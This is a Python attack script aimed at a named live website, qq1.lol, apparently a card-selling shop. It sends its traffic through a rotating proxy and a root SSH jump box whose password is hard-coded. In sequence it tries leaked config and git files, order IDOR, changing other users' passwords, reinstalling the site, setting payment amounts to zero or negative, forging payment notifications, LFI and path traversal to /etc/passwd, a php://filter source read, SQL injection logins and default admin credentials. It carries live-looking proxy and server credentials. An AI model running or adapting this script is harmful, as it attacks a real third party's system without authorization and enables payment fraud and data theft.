#!/usr/bin/env python3
"""qq1.lol comprehensive vulnerability probe via QG proxy + jump box"""
import json
import os
import re
import shlex
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/workspace/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "comprehensive_probe.log"
REPORT = OUT / "comprehensive_report.json"

QG_KEY = os.environ.get("QG_AUTHKEY", "C413ED6D")
QG_PWD = os.environ.get("QG_AUTHPWD", "344F550A6F8B")
JP_PASS = "DX4LmrDaPfd9"
JP_HOST = "42.240.167.114"
JAR = str(OUT / ".probe_cookies")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"

_proxy = None
report = {"ts": datetime.now().isoformat(), "findings": [], "tests": {}}


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def finding(severity, title, detail, exploitability=""):
    f = {"severity": severity, "title": title, "detail": detail, "exploitability": exploitability}
    report["findings"].append(f)
    log(f"[{severity}] {title}: {detail[:120]}")


def get_proxy():
    global _proxy
    if _proxy:
        return _proxy
    try:
        r = subprocess.run(
            ["curl", "-s", f"https://share.proxy.qg.net/get?key={QG_KEY}&num=1"],
            capture_output=True, text=True, timeout=15,
        )
        data = json.loads(r.stdout)
        if data.get("code") == "SUCCESS":
            srv = data["data"][0]["server"]
            _proxy = f"http://{QG_KEY}:{QG_PWD}@{srv}"
            return _proxy
    except Exception as e:
        log(f"proxy err: {e}")
    return None


def qg_curl(url, method="GET", post=None, extra_headers=None, timeout=25):
    proxy = get_proxy()
    parts = ["curl", "-sk", "--max-time", str(timeout), "-b", JAR, "-c", JAR, "-A", UA]
    if proxy:
        parts[2:2] = ["-x", proxy]
    if extra_headers:
        for h in extra_headers:
            parts += ["-H", h]
    if method == "POST":
        parts += ["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded"]
        if post:
            parts += ["-d", post]
    elif method == "HEAD":
        parts.append("-I")
    parts.append(url)
    inner = " ".join(shlex.quote(p) for p in parts)
    cmd = ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", inner]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 15)
        return r.stdout.strip(), r.stderr.strip()
    except Exception as e:
        return "", str(e)


def get_csrf(page="/"):
    body, _ = qg_curl(f"{BASE}{page}")
    m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', body)
    return m.group(1) if m else ""


def init():
    get_proxy()
    qg_curl(f"{BASE}/")


# --- 1. File/config leaks ---
def test_file_leaks():
    log("=== [1] File/config leak scan ===")
    paths = [
        ".git/HEAD", ".git/config", ".git/index", ".env", ".env.bak",
        "config.php", "config.php.bak", "config.php~", "config.inc.php",
        "backup.zip", "backup.sql", "backup.tar.gz", "db.sql", "data.sql",
        "www.zip", "web.zip", "site.zip", "qq1.lol.zip",
        "phpinfo.php", "info.php", "test.php", "debug.php", "1.php",
        "install/install.lock", "install/index.php", "install/",
        "runtime/log/", "runtime/logs/", "logs/", "log/error.log",
        "data/config.php", "includes/config.php", "inc/config.php",
        "assets/faka/config.php", ".svn/entries", ".DS_Store",
        "robots.txt", "sitemap.xml", ".well-known/security.txt",
        "composer.json", "composer.lock", "package.json",
        "admin/", "admin.php", "manage/", "htgl/", "shequ/", "fenzhan/",
        "user/ajax.php", "user/api.php", "api/v1/", "api/v2/",
        "upload/", "upload.php", "other/epay_notify.php",
        "template/", "templates/", "cache/", "runtime/",
        "workorder.php", "toollogs.php", "cron.php",
    ]
    hits = []
    for p in paths:
        body, _ = qg_curl(f"{BASE}/{p}")
        if not body:
            continue
        # HEAD-like from full GET
        interesting = False
        if p.endswith("/") and ("index" in body.lower() or "login" in body.lower() or "install" in body.lower()):
            interesting = True
        if "ref: refs/" in body or "[core]" in body or "DB_" in body or "password" in body.lower():
            interesting = True
        if "<?php" in body and "config" in p:
            interesting = True
        if body.startswith("{") and '"code"' in body:
            interesting = True
        if len(body) > 50 and "404" not in body[:100] and "Not Found" not in body[:200]:
            if any(x in body for x in ["安装锁", "getcount", "login", "orderItem", "toollogs", "workorder"]):
                interesting = True
        if interesting:
            hits.append({"path": p, "len": len(body), "preview": body[:300]})
            log(f"  HIT [{p}] {len(body)}b: {body[:80]}")
    report["tests"]["file_leaks"] = hits
    if any(".git" in h["path"] for h in hits):
        finding("CRITICAL", ".git exposure", str(hits), "Source code recovery")
    return hits


# --- 2. Ajax enumeration ---
def test_ajax_actions():
    log("=== [2] Ajax action enumeration ===")
    actions = [
        "getcount", "getclass", "gettool", "gettoolnew", "getleftcount",
        "checklogin", "query", "order", "captcha", "cart_info", "cart_list",
        "gift_start", "getshareid", "getshuoshuo", "getrizhi",
        "login", "reg", "userinfo", "pay", "notify", "upload", "config",
        "getorder", "orderlist", "getuser", "recharge", "withdraw",
        "admin", "siteinfo", "getconfig", "getsite", "getmoney",
        "changepwd", "apply_refund", "delcart", "addcart", "editcart",
        "coupon", "cutshop", "groupshop", "seckill", "workorder",
        "export", "download", "backup", "reset", "install", "update",
        "sendcode", "verify", "bind", "unbind", "oauth", "connect",
        "toollogs", "getcard", "cardlist", "faka", "send",
    ]
    results = {}
    for act in actions:
        body, _ = qg_curl(f"{BASE}/ajax.php?act={act}", "POST", "")
        results[act] = body[:500]
        if body and '"code":0' in body:
            log(f"  *** {act}: {body[:150]}")
        elif body and '"code"' in body and '"code":-1' not in body and '"code":-5' not in body:
            log(f"  ? {act}: {body[:100]}")
    report["tests"]["ajax"] = results
    return results


def test_user_ajax():
    log("=== [2b] user/ajax.php & api.php ===")
    endpoints = [
        ("user/ajax.php", ["login", "reg", "userinfo", "recharge", "orderlist", "getorder", "changepwd", "upload"]),
        ("api.php", ["getcount", "gettool", "order", "pay", "login"]),
        ("sup/ajax.php", ["login", "userinfo", "orderlist", "getorder", "upload", "config", "getmoney"]),
    ]
    results = {}
    for ep, acts in endpoints:
        for act in acts:
            body, _ = qg_curl(f"{BASE}/{ep}?act={act}", "POST", "")
            key = f"{ep}?act={act}"
            results[key] = body[:400]
            if body and '"code":0' in body:
                log(f"  *** {key}: {body[:120]}")
    report["tests"]["other_ajax"] = results
    return results


# --- 3. IDOR tests ---
def test_idor():
    log("=== [3] IDOR tests ===")
    csrf = get_csrf("/?mod=query")
    results = {}

    # order without skey
    for oid in [1, 100, 25900, 25915]:
        body, _ = qg_curl(f"{BASE}/ajax.php?act=order", "POST", f"id={oid}&skey=")
        results[f"order_no_skey_{oid}"] = body[:200]
        log(f"  order id={oid} no skey: {body[:80]}")

    # changepwd IDOR
    for oid in [1, 25915]:
        body, _ = qg_curl(f"{BASE}/ajax.php?act=changepwd", "POST",
                         f"csrf_token={csrf}&id={oid}&skey=test&pwd=123456&pwd2=123456")
        results[f"changepwd_{oid}"] = body[:200]
        log(f"  changepwd id={oid}: {body[:80]}")

    # apply_refund IDOR
    for oid in [1, 25915]:
        body, _ = qg_curl(f"{BASE}/ajax.php?act=apply_refund", "POST",
                         f"csrf_token={csrf}&id={oid}&skey=test&content=test")
        results[f"apply_refund_{oid}"] = body[:200]
        log(f"  apply_refund id={oid}: {body[:80]}")

    # cart manipulation
    body, _ = qg_curl(f"{BASE}/ajax.php?act=cart_info", "POST", "id=1")
    results["cart_info_1"] = body[:200]
    body, _ = qg_curl(f"{BASE}/ajax.php?act=addcart", "POST", f"csrf_token={csrf}&tid=131&num=1")
    results["addcart"] = body[:200]
    log(f"  addcart: {body[:80]}")

    report["tests"]["idor"] = results
    return results


# --- 4. File upload ---
def test_upload():
    log("=== [4] File upload endpoints ===")
    csrf = get_csrf("/")
    endpoints = [
        ("ajax.php?act=upload", f"csrf_token={csrf}"),
        ("user/ajax.php?act=upload", f"csrf_token={csrf}"),
        ("sup/ajax.php?act=upload", ""),
    ]
    results = {}
    for ep, data in endpoints:
        # test without file
        body, _ = qg_curl(f"{BASE}/{ep}", "POST", data)
        results[ep] = body[:300]
        log(f"  {ep}: {body[:100]}")
    report["tests"]["upload"] = results
    return results


# --- 5. Install reinstall ---
def test_install():
    log("=== [5] Install/reinstall attack ===")
    results = {}
    for p in ["install/", "install/index.php", "install/install.lock", "install/step2.php", "install/step3.php"]:
        body, _ = qg_curl(f"{BASE}/{p}")
        results[p] = {"len": len(body), "preview": body[:400]}
        log(f"  {p}: {len(body)}b {body[:80]}")
    # try POST to install
    body, _ = qg_curl(f"{BASE}/install/index.php", "POST", "step=1&dbhost=127.0.0.1")
    results["install_post"] = body[:400]
    report["tests"]["install"] = results
    if "安装锁" in str(results):
        finding("MEDIUM", "install.lock readable", "install/install.lock returns content", "Reinstall if lock deletable")
    return results


# --- 6. OAuth connect ---
def test_oauth():
    log("=== [6] OAuth connect.php ===")
    results = {}
    for provider in ["qq", "wechat", "weibo", "alipay", "github", "google"]:
        body, _ = qg_curl(f"{BASE}/user/connect.php?type={provider}")
        results[f"type={provider}"] = body[:400]
        log(f"  connect type={provider}: {body[:80]}")
    # callback SSRF
    for cb in [
        "user/connect.php?type=qq&code=test",
        "user/connect.php?act=callback&type=qq",
        "user/oauth_callback.php",
        "other/oauth.php",
    ]:
        body, _ = qg_curl(f"{BASE}/{cb}")
        results[cb] = body[:300]
    report["tests"]["oauth"] = results
    return results


# --- 7. getshuoshuo/getrizhi hashsalt ---
def test_hashsalt():
    log("=== [7] hashsalt endpoints ===")
    body, _ = qg_curl(f"{BASE}/?mod=buy&cid=14&tid=131")
    m = re.search(r"var hashsalt=([^;]+);", body)
    hs_expr = m.group(1) if m else ""
    results = {"hashsalt_expr_len": len(hs_expr)}

    for act in ["getshuoshuo", "getrizhi"]:
        for hs in ["", "test", "0", "null", "undefined"]:
            post = f"uin=123456&page=1&hashsalt={hs}" if act == "getshuoshuo" else f"page=1&hashsalt={hs}"
            body, _ = qg_curl(f"{BASE}/ajax.php?act={act}", "POST", post)
            results[f"{act}_hs={hs}"] = body[:300]
            if body and '"code":0' in body:
                log(f"  *** {act} hs={hs}: {body[:120]}")
                finding("HIGH", f"{act} bypass", body[:200], "Potential data leak")
    report["tests"]["hashsalt"] = results
    return results


# --- 8. Subdomains ---
def test_subdomains():
    log("=== [8] Subdomains (from jump box) ===")
    domains = [
        "www.qq1.lol", "admin.qq1.lol", "sup.qq1.lol", "api.qq1.lol",
        "m.qq1.lol", "pay.qq1.lol", "ka1.one", "htqq.lol", "fffzz.lol",
    ]
    results = {}
    for d in domains:
        body, _ = qg_curl(f"https://{d}/")
        results[d] = {"len": len(body), "preview": body[:200]}
        if body and len(body) > 100:
            log(f"  {d}: {len(body)}b {body[:60]}")
    report["tests"]["subdomains"] = results
    return results


# --- 9. Payment amount manipulation ---
def test_payment():
    log("=== [9] Payment amount manipulation ===")
    csrf = get_csrf("/?mod=buy&cid=14&tid=131")
    results = {}

    # pay with manipulated price
    for money in ["0.01", "0", "-1", "0.001", "99", "0.1"]:
        post = f"csrf_token={csrf}&tid=131&num=1&money={money}&paytype=alipay"
        body, _ = qg_curl(f"{BASE}/ajax.php?act=pay", "POST", post)
        results[f"pay_money={money}"] = body[:400]
        log(f"  pay money={money}: {body[:100]}")
        if body and '"code":0' in body:
            m = re.search(r'trade_no["\s:]+([0-9]+)', body)
            if m:
                finding("CRITICAL", "Payment amount manipulation", f"money={money} trade={m.group(1)}", "Free/cheap card purchase")

    # notify with wrong amount
    trade = "20260720145603146"
    for money in ["0.01", "1.00", "99.00"]:
        post = f"pid=1&trade_no={trade}&out_trade_no={trade}&type=alipay&name=test&money={money}&trade_status=TRADE_SUCCESS&sign=test&sign_type=MD5"
        body, _ = qg_curl(f"{BASE}/other/epay_notify.php", "POST", post)
        results[f"notify_money={money}"] = body[:200]
        log(f"  notify money={money}: {body[:60]}")

    report["tests"]["payment"] = results
    return results


# --- 10. Admin panels ---
def test_admin_paths():
    log("=== [10] Admin panel discovery ===")
    paths = [
        "admin/", "admin/login.php", "admin/index.php", "admin888/", "manage/",
        "htgl/", "backend/", "console/", "panel/", "master/", "agent/",
        "sup/", "sup/index.php", "sup/login.php", "sup/admin.php",
        "user/index.php", "user/admin.php", "fenzhan/", "shequ/",
        "workorder.php", "workorder/", "gongdan.php", "ticket.php",
        "toollogs.php", "logs.php", "export.php", "data/export.php",
    ]
    results = {}
    for p in paths:
        body, _ = qg_curl(f"{BASE}/{p}")
        if body and len(body) > 200 and "404" not in body[:150]:
            results[p] = {"len": len(body), "preview": body[:300]}
            log(f"  [{p}] {len(body)}b")
    report["tests"]["admin_paths"] = results
    return results


# --- 11. SSRF/LFI/path traversal ---
def test_ssrf_lfi():
    log("=== [11] SSRF/LFI/path traversal ===")
    payloads = [
        ("?mod=query&data=../../../etc/passwd", "lfi_query"),
        ("ajax.php?act=query", "data=../../../etc/passwd"),
        ("user/connect.php?url=http://127.0.0.1/", "oauth_ssrf"),
        ("other/submit.php?type=alipay&orderid=1", "submit"),
        ("?file=../../../etc/passwd", "file_param"),
        ("?page=../../../etc/passwd", "page_param"),
        ("?mod=php://filter/convert.base64-encode/resource=config", "php_filter"),
        ("assets/faka/../../../config.php", "path_traversal"),
        ("?mod=query&data=' OR 1=1--", "sqli_query"),
    ]
    results = {}
    for path, name in payloads:
        if path.startswith("ajax"):
            body, _ = qg_curl(f"{BASE}/{path.split()[0]}", "POST", path.split()[1] if len(path.split()) > 1 else "")
        else:
            body, _ = qg_curl(f"{BASE}/{path}")
        results[name] = body[:300]
        if "root:" in body or "PD9waHA" in body:
            finding("CRITICAL", f"LFI/traversal {name}", body[:200], "Config/source read")
        log(f"  {name}: {body[:60]}")
    report["tests"]["ssrf_lfi"] = results
    return results


# --- 12. Reg/login bypass ---
def test_auth_bypass():
    log("=== [12] Auth bypass ===")
    csrf = get_csrf("/user/login.php")
    results = {}

    # login without captcha
    for user, pwd in [("admin", "admin"), ("' OR '1'='1", "' OR '1'='1")]:
        post = f"csrf_token={csrf}&user={quote(user)}&pass={quote(pwd)}"
        body, _ = qg_curl(f"{BASE}/ajax.php?act=login", "POST", post)
        results[f"ajax_login_{user[:10]}"] = body[:200]
        log(f"  ajax login {user}: {body[:80]}")

    # reg without captcha
    csrf2 = get_csrf("/user/reg.php")
    post = f"csrf_token={csrf2}&user=testuser999&pass=Test123456&qq=123456&email=test@test.com"
    body, _ = qg_curl(f"{BASE}/ajax.php?act=reg", "POST", post)
    results["ajax_reg"] = body[:200]
    log(f"  ajax reg: {body[:80]}")

    # sup login bypass
    body, _ = qg_curl(f"{BASE}/sup/ajax.php?act=login", "POST", "user=admin&pass=admin")
    results["sup_login_nocaptcha"] = body[:200]

    report["tests"]["auth_bypass"] = results
    return results


# --- 13. toollogs, workorder ---
def test_toollogs_workorder():
    log("=== [13] toollogs & workorder ===")
    results = {}
    for p in ["toollogs.php", "workorder.php", "workorder/", "?mod=workorder"]:
        body, _ = qg_curl(f"{BASE}/{p}")
        results[p] = body[:500]
        log(f"  {p}: {body[:100]}")
    for act in ["workorder", "toollogs", "getworkorder", "addworkorder"]:
        body, _ = qg_curl(f"{BASE}/ajax.php?act={act}", "POST", "page=1")
        results[f"ajax_{act}"] = body[:300]
        if '"code":0' in body:
            log(f"  *** ajax {act}: {body[:120]}")
    report["tests"]["toollogs_workorder"] = results
    return results


# --- 14. mod= parameters ---
def test_mod_params():
    log("=== [14] mod= parameters ===")
    mods = [
        "fenlei", "query", "buy", "cutshop", "groupshop", "seckill",
        "coupon", "so", "article", "notice", "help", "about",
        "recharge", "cart", "order", "user", "agent", "fenzhan",
        "workorder", "toollogs", "gift", "share", "invite",
    ]
    results = {}
    for mod in mods:
        body, _ = qg_curl(f"{BASE}/?mod={mod}")
        results[mod] = {"len": len(body), "has_form": "<form" in body.lower(), "preview": body[:200]}
        if len(body) > 500:
            log(f"  mod={mod}: {len(body)}b")
    # cutshop/coupon ajax
    for act in ["cutshop", "coupon", "groupshop", "seckill", "gift_start"]:
        body, _ = qg_curl(f"{BASE}/ajax.php?act={act}", "POST", "tid=131")
        results[f"ajax_{act}"] = body[:300]
        if '"code":0' in body:
            log(f"  *** ajax {act}: {body[:120]}")
    report["tests"]["mod_params"] = results
    return results


# --- Extra: cron, captcha bypass on pay, getleftcount ---
def test_extras():
    log("=== [Extra] cron, pay captcha, getleftcount, gift ===")
    results = {}
    for k in ["123456", "qq1", "buyi", "cron", "jiankong"]:
        body, _ = qg_curl(f"{BASE}/cron.php?key={k}")
        results[f"cron_{k}"] = body[:100]
    body, _ = qg_curl(f"{BASE}/ajax.php?act=getleftcount", "POST", "tid=131")
    results["getleftcount"] = body[:200]
    body, _ = qg_curl(f"{BASE}/ajax.php?act=gift_start", "POST", "")
    results["gift_start"] = body[:200]
    body, _ = qg_curl(f"{BASE}/ajax.php?act=getshareid", "POST", "")
    results["getshareid"] = body[:200]
    for act in ["getorder", "orderlist", "getuser", "getmoney", "userinfo"]:
        body, _ = qg_curl(f"{BASE}/ajax.php?act={act}", "POST", "")
        results[act] = body[:200]
        if '"code":0' in body:
            log(f"  *** {act}: {body[:120]}")
    report["tests"]["extras"] = results
    return results


def main():
    log("=== qq1.lol comprehensive probe start ===")
    init()

    test_file_leaks()
    test_ajax_actions()
    test_user_ajax()
    test_idor()
    test_upload()
    test_install()
    test_oauth()
    test_hashsalt()
    test_subdomains()
    test_payment()
    test_admin_paths()
    test_ssrf_lfi()
    test_auth_bypass()
    test_toollogs_workorder()
    test_mod_params()
    test_extras()

    with open(REPORT, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    log(f"=== Done -> {REPORT} ({len(report['findings'])} findings) ===")


if __name__ == "__main__":
    main()
